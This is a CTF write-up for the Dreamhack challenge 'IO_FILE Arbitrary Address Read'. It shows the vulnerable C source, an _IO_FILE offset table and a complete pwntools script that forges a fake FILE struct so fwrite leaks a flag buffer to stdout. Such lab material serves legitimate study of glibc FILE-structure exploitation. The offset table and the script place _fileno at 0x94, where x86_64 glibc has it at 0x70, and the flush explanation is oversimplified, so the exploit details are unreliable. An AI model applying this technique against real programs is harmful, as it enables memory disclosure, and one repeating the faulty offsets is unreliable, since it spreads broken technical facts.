---
title: "[Dreamhack] IO_FILE Arbitrary Address Read"
date: 2024-01-14 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, io-file, file-struct, arbitrary-read, dreamhack]
author: datious
description: "Dreamhack writeup: IO_FILE Arbitrary Address Read — ghi đè FILE object struct để đọc dữ liệu từ địa chỉ tùy ý."
---

# [Write up for Dreamhack] Challenge: IO_FILE Arbitrary Address Read
**Author: datious**

## Source code

```c
// Name: iofile_aar
// gcc -o iofile_aar iofile_aar.c -no-pie

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
FILE *fp;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
    FILE *fp;
    fp = fopen("./home/iofile_aar/flag", "r");
    fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
    fclose(fp);
}

int main() {
  const char *data = "TEST FILE!";
  init();
  read_flag();

  fp = fopen("./home/iofile_aar/tmp/testfile", "w");

  printf("Data: ");
  read(0, fp, 300);          // ← Write 300 bytes into the FILE object!

  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}
```

**Vulnerability:** `read(0, fp, 300)` writes user input **directly into the `FILE` object struct**!

**Protection:** Canary, RELRO, Fortify, and PIE are **disabled**. NX is enabled.

## 1. Analyzing and Gathering

The program lets us overwrite the `FILE` object `fp` with arbitrary bytes, then calls `fwrite(data, ..., fp)`.

**`FILE` object structure (`_IO_FILE`):**

```
offset 0x00: _flags          # stream status bits
offset 0x08: _IO_read_ptr    # read pointer
offset 0x10: _IO_read_end    # read end pointer
offset 0x18: _IO_read_base   # read base pointer
offset 0x20: _IO_write_base  # write base ← key!
offset 0x28: _IO_write_ptr   # write ptr  ← key!
offset 0x30: _IO_write_end
offset 0x38: _IO_buf_base
offset 0x40: _IO_buf_end
...
offset 0x94: _fileno         # file descriptor
...
```

**How `fwrite` works (simplified):**

```c
// fwrite(data, size, count, fp)
// writes [_IO_write_base ... _IO_write_ptr] to fileno
// We control _IO_write_base, _IO_write_ptr, _fileno!
```

## 2. Strategy

**Goal:** Make `fwrite` output the content of `flag_buf` (BSS) to stdout.

**Craft a fake FILE object:**
- Set `_IO_write_base` = `flag_buf` address (BSS)
- Set `_IO_write_ptr`  = `flag_buf + 1024`
- Set `_fileno`        = `1` (stdout)
- Set `_flags`         = `0xfbad0000` (magic + disable sync)

```python
from pwn import *
from struct import pack

exe  = ELF('./iofile_aar')
p    = process('./iofile_aar')
# or: p = remote(...)

flag_buf = exe.sym['flag_buf']  # BSS address

def craft_fake_file(write_base, write_ptr, fileno):
    fake  = p32(0xfbad0000)   # _flags
    fake += p32(0)             # padding
    fake += p64(0)             # _IO_read_ptr
    fake += p64(0)             # _IO_read_end
    fake += p64(0)             # _IO_read_base
    fake += p64(write_base)    # _IO_write_base  ← flag_buf
    fake += p64(write_ptr)     # _IO_write_ptr   ← flag_buf + 1024
    fake += p64(0)             # _IO_write_end
    fake += p64(0)             # _IO_buf_base
    fake += p64(0)             # _IO_buf_end
    fake  = fake.ljust(0x94, b'\x00')
    fake += p32(fileno)        # _fileno = 1 (stdout)
    return fake

payload = craft_fake_file(flag_buf, flag_buf + 1024, 1)

p.sendafter("Data: ", payload)
flag = p.recv(1024)
log.success(f"Flag: {flag}")
```
